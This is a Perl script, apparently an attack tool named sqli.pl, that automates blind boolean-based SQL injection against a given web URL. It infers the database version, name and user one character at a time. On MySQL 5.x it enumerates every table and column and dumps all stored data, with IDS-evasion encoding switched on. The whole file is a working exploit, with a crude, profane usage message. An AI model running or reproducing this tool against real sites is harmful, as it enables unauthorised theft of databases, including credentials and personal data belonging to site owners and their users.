use strict;
use Getopt::Std;
use Digest::MD5 qw(md5_hex);
use LW2;
 
my %options = ();
getopts("u:h:q:", \%options);
 
my $url     = $options{u};			# Vuln URL
my $host    = $options{h};			# Needs this for libwhisker


						# Format.
my $count   = 0;


if ( $url eq "" ) {
    print "\n[!] need a url or hostname preferably both [!]\n";
	print "\n[+] Try maybe- IDK fucking perl sqli.pl -u <web host> -h <hostname> fucking cunt LOL ";
	print "\n[+] perl sqli.pl -u http://testphp.vulnweb.com/ -h 18.192.172.30";
    print "\n[!] Aboring......\n";
    exit(1);
}

if (my $q = $options{q}) {
    $q =~ s/\ /%20/g;
    my ($cxr, $result) = runQuery($url,$host,$q);
    print "Query Result:\n\t$result\nCalculated in $cxr requests.\n";
    exit(1);   
}
 
# Get the Database Version
my $query = "SELECT%20VERSION()";
my ($tmp, $version) = runQuery($url, $host, $query);
$count += $tmp;
$count += 2;
print "\nDatabase Version:\t\t$version\nIn $count requests.\n\n";
 
# Get the Database Name
$query = "SELECT%20DATABASE()";
my ($tmp,$answer) = runQuery($url, $host, $query);
print "Database Name:\t\t$answer\nIn $tmp requests.\n\n";
 
# Get the Database Username
$query = "SELECT%20USER()";
my ($tmp,$answer) = runQuery($url, $host, $query);
print "Database User:\t\t$answer\nIn $tmp requests.\n\n";
 
 
if ($version =~ /5\./g)
{
	print "Enumerating Database Spec:\n";
	getSchema($url,$host);
	exit(1);
} else {
	print "This is not MySQL v5.x, so I can't enumerate the schema tables!\n";
	exit(1);
}
 
sub getSchema
{
	my $url       = shift;
	my $host      = shift;
	my $query     = "SELECT COUNT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=(SELECT DATABASE())";
	$query        =~ s/ /%20/g;
 
	my ($c, $val) = runQuery($url,$host,$query);
	for (my $i=0; $i < int($val); ++$i)
	{
		$query = "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=(SELECT DATABASE()) LIMIT $i,1";
		$query =~ s/ /%20/g;
 
		my ($q, $table) = runQuery($url,$host,$query);
		print "$table:\n";#table name 
		$query = "SELECT COUNT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=";
		$query .= "(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=";
		$query .= "(SELECT DATABASE()) LIMIT $i,1)";
		$query =~ s/ /%20/g;
 
		my ($r, $fcount) = runQuery($url,$host,$query);
		# $fcount - number of columns in the table
		for (my $n = 0; $n < int($fcount); ++$n)
		{
			$query  = "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=";
			$query .= "(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=";
			$query .= "(SELECT DATABASE()) LIMIT $i,1) LIMIT $n,1";
			$query =~ s/ /%20/g;
			my ($o, $field) = runQuery($url,$host,$query);
			print "\t$field\n";
			# scrape main database.
			$query = "SELECT COUNT($field) FROM $table";
			$query =~ s/ /%20/g;
			my ($r, $total) = runQuery($url,$host,$query);
			for (my $cn = 0; $cn < $total; $cn++)
			{
			    $query = "SELECT $field FROM $table LIMIT $cn,1";
			    $query =~ s/ /%20/g;
			    my ($e, $data) = runQuery($url,$host,$query);
			    print "\t\t$data\n";
			}
		}
	}
}
 
sub runQuery
{
	my $url   = shift;
	my $host  = shift;
	my $query = shift;
 
	my $qCount;
	my $qCH;
 
	my $pos     = 1;
	my $floor   = 0;				# Bottom of ascii keyrange
	my $ceiling = 255;				# Top of ascii keyrange
 
	my $spacer  = "%20OR%20";
	my $truth   = "62=62/*";
	my $lie     = "88=98/*";
 
	my ($true, $false) = makeTrueFalse($url, $spacer, $truth, $lie, $host);
	my $lenUri = "$url" . queryConstruct(0, 0, $spacer, $query);
	my ($qCH, $len) = getValue($lenUri, 64, 0, $true, $false, $host);
	$qCount += $qCH;
	my $results = "";
	while (($pos < $len) || ($pos eq $len))
	{
		my $uri = "$url" . queryConstruct(1, $pos, $spacer, $query);  #construct the actual URI
		my ($qCH, $value) = getValue($uri, $ceiling, $floor, $true, $false, $host);
		$qCount += $qCH;
		my $char = chr("$value");
		$results .= $char;
		++$pos;
	}
	return ($qCount, $results);
}
 
#Logrithm
sub getValue 
{
	my $uri     = shift;
	my $ceiling = shift;
	my $floor   = shift;
	my $true    = shift;
	my $false   = shift;
	my $host    = shift;
 
	my $nextmaybe;
	my $target;
	my $qCount = 0;
 
	my $maybe = int($ceiling/2);    
 
	while (not defined $target) {
		if (isGT($uri, $maybe, $host) eq $true)	
		{
			++$qCount;
			$floor = $maybe;
			$nextmaybe = int($maybe + (($ceiling - $floor)/2));
		} elsif (isLT($uri, $maybe, $host) eq $true)
		{
			++$qCount;
			$ceiling = $maybe;
			$nextmaybe = int($maybe - (($ceiling - $floor)/2));
		} elsif (isEQ($uri, $maybe, $host) eq $true)
		{
			++$qCount;
			$target = $maybe;
			return ($qCount, $target);
		}
		$maybe = $nextmaybe;
		if (($maybe eq "") || (!$maybe) || (not defined $maybe))
		{
			print "[-] SQL Error caught!  Aborting!\n";
			print "[-] At least 3 queries in error log!\n";
			print "[-] SQL SERVER MAYBE TO HIGH OR TOO LOW LEVEL\n";
			exit(1);
		}
	}
}
 
# Is greater than?
sub isGT
{
	my $uri   = shift;
	my $guess = shift;
	my $host  = shift;
	return (md5_hex(download("$uri>$guess)/*", $host)));
}
 
# Is less than?
sub isLT
{
	my $uri   = shift;
	my $guess = shift;
	my $host  = shift;
	return (md5_hex(download("$uri<$guess)/*", $host)));
}
 
sub isEQ
{
	my $uri   = shift;
	my $guess = shift;
	my $host  = shift;
	return (md5_hex(download("$uri=$guess)/*", $host)));
}
 
# Ripped off from an older version of the scanner
sub download
{
    my $uri = shift;
    my $try = 5;
    my $host = shift;
    my %request;
    my %response;
    LW2::http_init_request(\%request);
    $request{'whisker'}->{'method'} = "GET";
    $request{'whisker'}->{'host'} = $host;
    $request{'whisker'}->{'uri'} = $uri;
    $request{'whisker'}->{'encode_anti_ids'} = 962;
    $request{'whisker'}->{'user-agent'} = "wget";
    LW2::http_fixup_request(\%request);
    if(LW2::http_do_request(\%request, \%response)) {
        if($try < 5) {
            print "Failed to fetch $uri on try $try. Retrying...\n";
            return undef if(!download($uri, $try++));
        }
        print "Failed to fetch $uri.\n";
        return undef;
    } else {
        return ($response{'whisker'}->{'data'}, $response{'whisker'}->{'data'});
    }
}
 
sub queryConstruct
{
	my $type    = shift;
	my $pos     = shift;
	my $spacer  = shift;
	my $query   = shift;
 
	if ($type eq 0)		# Len
	{
		my $newQuery = "LENGTH(($query))";
		my $padding  = "(";
		my $ender    = "";
		return ("$spacer$padding$newQuery$ender");
	} elsif ($type eq 1) 	# String
	{
		my $padding = "((ASCII((LOWER((MID((";          #query construction 
		my $ender   = "),$pos,1))))))";                 # End query Construct
		return ("$spacer$padding$query$ender");  	#construct the actual query
	}
}
 
sub makeTrueFalse
{
	my $url    = shift;
	my $spacer = shift;
	my $truth  = shift;
	my $lie    = shift;
	my $host   = shift;
	my $trueMD = md5_hex(download("$url$spacer$truth", $host));
	my $falsMD = md5_hex(download("$url$spacer$lie", $host));
 
	# returns true, false
	return ($trueMD, $falsMD); 
}
 
